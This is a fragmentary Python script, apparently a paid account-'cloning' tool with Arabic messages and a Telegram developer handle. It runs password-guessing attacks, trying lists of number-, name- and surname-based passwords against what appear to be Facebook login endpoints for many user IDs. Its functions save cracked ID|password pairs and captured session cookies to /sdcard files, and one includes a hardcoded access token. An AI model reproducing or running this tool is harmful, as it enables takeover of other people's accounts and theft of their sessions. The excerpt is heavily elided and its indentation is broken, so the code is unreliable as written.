...
end_datetime = datetime.datetime(2025, 2, 5, 10, 30, 0) #
...
print(f" الوقت المتبقي من اشتراكك  : {remaining_time}")

if datetime.datetime.now(iraq_timezone) >= end_datetime.astimezone(iraq_timezone):
    print(" تم ايقاف الأداة راسل المطور للتفعيل @k6_vk ") #
    exit(0)
import requests
from os import path
...
print('\n\033[1;33m✅ تـم تشـغيل الـمدفوع انـتضــر التــشغـيـل ')


import datetime
an = datetime.datetime.now()
an2 = datetime.datetime(2024, 4, 15, 5, 30, 00)
if an > an2 or an == an2:
...
open('.proxy1.txt','w').write(gold1)
open('.proxy2.txt','w').write(gold2)
open('.proxy3.txt','w').write(gold3)
open('.proxy4.txt','w').write(gold4)
open('.proxy5.txt','w').write(gold5)
open('.proxy6.txt','w').write(gold6)
...
def new_file(cookies,access_token):
        ...
        for el in range(sl):
                ...
                os.system('cat .txt | grep "'+sid+'" > .temp.txt')
        file = open('.temp.txt','r').read().splitlines()
        print('\n \033[1;97m /sdcard/@k6_vk-OK.txt \033[0;97m\n')
        #100010138361148
        sf = input(' Saved File As : ')
        print('')
        os.system('clear')
...
def menu():
        ...
        try:
                ...
                if "server on" in sj:
                        #clear()
                        print('\x1b[1;96m [01] \x1b[1;92mFile cloning\n \x1b[1;96m[02] \x1b[1;93mCreate file\n \x1b[1;96m[03] \x1b[1;94mPublic cloning\n')
                        linex()
                        xd=input(' Choose > ')
                        if xd in ['1','01']:
                                ...
                                try:
                                        ...
                                        menu()
                                linex()
                                print(' \x1b[1;96m[01] \x1b[1;92mMethod \x1b[1;96m1  \n \x1b[1;96m[02] \x1b[1;93mMethod \x1b[1;96m2 \n \x1b[1;96m[03] \x1b[1;94mMethod \x1b[1;96m3 ')
                                linex()
                                mthd=input(' Choose: ')
                                linex()
                                plist = []
                                print('\x1b[1;96m [01] \x1b[1;92mPassowrd Number \n\x1b[1;96m [02] \x1b[1;93mChoose Passowrd \n\x1b[1;96m [03] \x1b[1;94mPassowrd Name\n\x1b[1;96m [04] \x1b[1;95mCrack Passowrd Number and Last name ');linex()
                                ppp=input(' Choose: ')
                                if ppp in ['1','01']:
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;36m [\033[1;96m𝗩i𝗣\033[1;36m] \033[1;36m[\033[1;31m%s\033[1;36m] \033[1;36m[\033[1;32mOK\033[1;30m:-\033[1;32m%s\033[1;36m] \033[1;36m[\033[1;33m%s%%\033[1;36m]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    "user-agent": ua,
                        ...
                        if "c_user" in ASX:
                                print('\r\r\033[1;32m [@k6_vk-OK] %s | %s'%(ids,pas))
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                open('/sdcard/@k6_vk-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/@k6_vk-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ASX:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [@k6_vk-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/@k6_vk-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [𝗩i𝗣] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                            ...
                            "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',}
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m ═══════[@k6_vk-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/@k6_vk-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                                ...
                                if 'session_key' in q:
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/@k6_vkCP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
...
def rndm(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        #print(data)
                        accessToken="5539618337|7097361149:AAEFcWGKkSv1yo35qXReclTUsJ7VUd8vNJ8"
                        headers={
                                    "method": 'GET', 
    "path": '/',
    "scheme": 'https', 
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [@k6_vk-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/@k6_vk-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/@k6_vk-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        open('/sdcard/@k6_vk-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
